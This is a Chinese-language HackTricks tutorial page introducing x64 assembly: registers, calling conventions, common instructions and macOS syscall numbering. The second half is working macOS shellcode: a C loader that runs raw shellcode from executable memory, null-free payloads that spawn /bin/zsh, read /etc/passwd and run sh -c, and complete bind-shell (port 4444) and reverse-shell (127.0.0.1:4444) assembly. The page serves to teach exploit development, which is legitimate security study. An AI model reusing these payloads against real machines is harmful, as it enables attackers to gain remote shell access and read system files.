<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Introduction to x64</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="introduction-to-x64"><a class="header" href="#introduction-to-x64">Introduction to x64</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<h2 id="introduction-to-x64-1"><a class="header" href="#introduction-to-x64-1"><strong>Introduction to x64</strong></a></h2>
<p>x64，也称为 x86-64，是一种主要用于桌面和服务器计算的 64 位处理器架构。它起源于 Intel 生产的 x86 架构，后来被 AMD 采用并命名为 AMD64，现今是个人计算机和服务器中普遍使用的架构。</p>
<h3 id="registers"><a class="header" href="#registers"><strong>Registers</strong></a></h3>
<p>x64 在 x86 架构的基础上扩展，具有 <strong>16 个通用寄存器</strong>，标记为 <code>rax</code>、<code>rbx</code>、<code>rcx</code>、<code>rdx</code>、<code>rbp</code>、<code>rsp</code>、<code>rsi</code>、<code>rdi</code>，以及 <code>r8</code> 到 <code>r15</code>。每个寄存器可以存储一个 <strong>64 位</strong>（8 字节）值。这些寄存器还具有 32 位、16 位和 8 位的子寄存器，以便于兼容性和特定任务。</p>
<ol>
<li><strong><code>rax</code></strong> - 传统上用于 <strong>函数的返回值</strong>。</li>
<li><strong><code>rbx</code></strong> - 通常用作内存操作的 <strong>基址寄存器</strong>。</li>
<li><strong><code>rcx</code></strong> - 常用于 <strong>循环计数器</strong>。</li>
<li><strong><code>rdx</code></strong> - 在各种角色中使用，包括扩展算术操作。</li>
<li><strong><code>rbp</code></strong> - 堆栈帧的 <strong>基指针</strong>。</li>
<li><strong><code>rsp</code></strong> - <strong>栈指针</strong>，跟踪栈顶。</li>
<li><strong><code>rsi</code></strong> 和 <strong><code>rdi</code></strong> - 用于字符串/内存操作中的 <strong>源</strong> 和 <strong>目标</strong> 索引。</li>
<li><strong><code>r8</code></strong> 到 <strong><code>r15</code></strong> - 在 x64 中引入的额外通用寄存器。</li>
</ol>
<h3 id="calling-convention"><a class="header" href="#calling-convention"><strong>Calling Convention</strong></a></h3>
<p>x64 的调用约定在不同操作系统之间有所不同。例如：</p>
<ul>
<li><strong>Windows</strong>：前 <strong>四个参数</strong> 通过寄存器 <strong><code>rcx</code></strong>、<strong><code>rdx</code></strong>、<strong><code>r8</code></strong> 和 <strong><code>r9</code></strong> 传递。进一步的参数被推入栈中。返回值在 <strong><code>rax</code></strong> 中。</li>
<li><strong>System V（通常用于类 UNIX 系统）</strong>：前 <strong>六个整数或指针参数</strong> 通过寄存器 <strong><code>rdi</code></strong>、<strong><code>rsi</code></strong>、<strong><code>rdx</code></strong>、<strong><code>rcx</code></strong>、<strong><code>r8</code></strong> 和 <strong><code>r9</code></strong> 传递。返回值也在 <strong><code>rax</code></strong> 中。</li>
</ul>
<p>如果函数有超过六个输入，<strong>其余参数将通过栈传递</strong>。<strong>RSP</strong>，栈指针，必须 <strong>16 字节对齐</strong>，这意味着它指向的地址在任何调用发生之前必须能被 16 整除。这意味着通常我们需要确保在进行函数调用之前，RSP 在我们的 shellcode 中是正确对齐的。然而，在实践中，即使不满足此要求，系统调用通常也能正常工作。</p>
<h3 id="calling-convention-in-swift"><a class="header" href="#calling-convention-in-swift">Calling Convention in Swift</a></h3>
<p>Swift 有其自己的 <strong>调用约定</strong>，可以在 <a href="https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64"><strong>https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64</strong></a> 中找到。</p>
<h3 id="common-instructions"><a class="header" href="#common-instructions"><strong>Common Instructions</strong></a></h3>
<p>x64 指令集丰富，保持与早期 x86 指令的兼容性，并引入了新的指令。</p>
<ul>
<li><strong><code>mov</code></strong>：<strong>移动</strong>一个值从一个 <strong>寄存器</strong> 或 <strong>内存位置</strong> 到另一个。</li>
<li>示例：<code>mov rax, rbx</code> — 将 <code>rbx</code> 的值移动到 <code>rax</code>。</li>
<li><strong><code>push</code></strong> 和 <strong><code>pop</code></strong>：将值推入或弹出 <strong>栈</strong>。</li>
<li>示例：<code>push rax</code> — 将 <code>rax</code> 中的值推入栈中。</li>
<li>示例：<code>pop rax</code> — 将栈顶的值弹出到 <code>rax</code> 中。</li>
<li><strong><code>add</code></strong> 和 <strong><code>sub</code></strong>：<strong>加法</strong>和 <strong>减法</strong> 操作。</li>
<li>示例：<code>add rax, rcx</code> — 将 <code>rax</code> 和 <code>rcx</code> 中的值相加，并将结果存储在 <code>rax</code> 中。</li>
<li><strong><code>mul</code></strong> 和 <strong><code>div</code></strong>：<strong>乘法</strong>和 <strong>除法</strong> 操作。注意：这些指令在操作数使用方面有特定行为。</li>
<li><strong><code>call</code></strong> 和 <strong><code>ret</code></strong>：用于 <strong>调用</strong> 和 <strong>从函数返回</strong>。</li>
<li><strong><code>int</code></strong>：用于触发软件 <strong>中断</strong>。例如，<code>int 0x80</code> 用于 32 位 x86 Linux 的系统调用。</li>
<li><strong><code>cmp</code></strong>：<strong>比较</strong>两个值，并根据结果设置 CPU 的标志。</li>
<li>示例：<code>cmp rax, rdx</code> — 将 <code>rax</code> 与 <code>rdx</code> 进行比较。</li>
<li><strong><code>je</code>、<code>jne</code>、<code>jl</code>、<code>jge</code>、...</strong>：<strong>条件跳转</strong>指令，根据先前的 <code>cmp</code> 或测试结果改变控制流。</li>
<li>示例：在 <code>cmp rax, rdx</code> 指令之后，<code>je label</code> — 如果 <code>rax</code> 等于 <code>rdx</code>，则跳转到 <code>label</code>。</li>
<li><strong><code>syscall</code></strong>：在某些 x64 系统（如现代 Unix）中用于 <strong>系统调用</strong>。</li>
<li><strong><code>sysenter</code></strong>：在某些平台上的优化 <strong>系统调用</strong> 指令。</li>
</ul>
<h3 id="function-prologue"><a class="header" href="#function-prologue"><strong>Function Prologue</strong></a></h3>
<ol>
<li><strong>推送旧的基指针</strong>：<code>push rbp</code>（保存调用者的基指针）</li>
<li><strong>将当前栈指针移动到基指针</strong>：<code>mov rbp, rsp</code>（为当前函数设置新的基指针）</li>
<li><strong>在栈上为局部变量分配空间</strong>：<code>sub rsp, &lt;size&gt;</code>（其中 <code>&lt;size&gt;</code> 是所需的字节数）</li>
</ol>
<h3 id="function-epilogue"><a class="header" href="#function-epilogue"><strong>Function Epilogue</strong></a></h3>
<ol>
<li><strong>将当前基指针移动到栈指针</strong>：<code>mov rsp, rbp</code>（释放局部变量）</li>
<li><strong>从栈中弹出旧的基指针</strong>：<code>pop rbp</code>（恢复调用者的基指针）</li>
<li><strong>返回</strong>：<code>ret</code>（将控制权返回给调用者）</li>
</ol>
<h2 id="macos"><a class="header" href="#macos">macOS</a></h2>
<h3 id="syscalls"><a class="header" href="#syscalls">syscalls</a></h3>
<p>有不同类别的 syscalls，您可以 <a href="https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h"><strong>在这里找到它们</strong></a><strong>:</strong></p>
<pre><code class="language-c">#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
</code></pre>
<p>然后，您可以在<a href="https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master"><strong>此网址</strong></a><strong>中找到每个系统调用号：</strong></p>
<pre><code class="language-c">0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
</code></pre>
<p>因此，为了从 <strong>Unix/BSD 类</strong> 调用 <code>open</code> 系统调用 (<strong>5</strong>)，您需要添加它：<code>0x2000000</code></p>
<p>因此，调用 open 的系统调用编号将是 <code>0x2000005</code></p>
<h3 id="shellcodes"><a class="header" href="#shellcodes">Shellcodes</a></h3>
<p>要编译：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
</code></pre>
<p>{% endcode %}</p>
<p>提取字节：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
</code></pre>
<p>{% endcode %}</p>
<details>
<summary>测试 shellcode 的 C 代码</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
<p>int (*sc)();</p>
<p>char shellcode[] = "<INSERT SHELLCODE HERE>";</p>
<p>int main(int argc, char **argv) {
printf("[&gt;] Shellcode Length: %zd Bytes\n", strlen(shellcode));</p>
<p>void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);</p>
<p>if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-&gt; Return = %p\n", ptr);</p>
<p>void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-&gt; Return = %p\n", dst);</p>
<p>int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);</p>
<p>if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-&gt; Return = %d\n", status);</p>
<p>printf("[&gt;] Trying to execute shellcode...\n");</p>
<p>sc = ptr;
sc();</p>
<p>return 0;
}</p>
<pre><code>&lt;/details&gt;

#### Shell

取自[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)并进行了解释。

{% tabs %}
{% tab title="with adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="带堆栈" %}</p>
<pre><code class="language-armasm">bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h4 id="使用-cat-读取"><a class="header" href="#使用-cat-读取">使用 cat 读取</a></h4>
<p>目标是执行 <code>execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)</code>，因此第二个参数 (x1) 是一个参数数组（在内存中，这意味着一堆地址）。</p>
<pre><code class="language-armasm">bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
</code></pre>
<h4 id="使用-sh-调用命令"><a class="header" href="#使用-sh-调用命令">使用 sh 调用命令</a></h4>
<pre><code class="language-armasm">bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &amp;"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &amp;"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &amp;"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
</code></pre>
<h4 id="bind-shell"><a class="header" href="#bind-shell">Bind shell</a></h4>
<p>来自 <a href="https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html">https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html</a> 的 Bind shell 在 <strong>port 4444</strong></p>
<pre><code class="language-armasm">section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &amp;sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -&gt; dup2(client_sockid, 1)
;   -&gt; dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
</code></pre>
<h4 id="反向shell"><a class="header" href="#反向shell">反向Shell</a></h4>
<p>来自 <a href="https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html">https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html</a> 的反向Shell。反向Shell到 <strong>127.0.0.1:4444</strong></p>
<pre><code class="language-armasm">section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &amp;sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -&gt; dup2(sockid, 1)
;   -&gt; dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
</code></pre>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
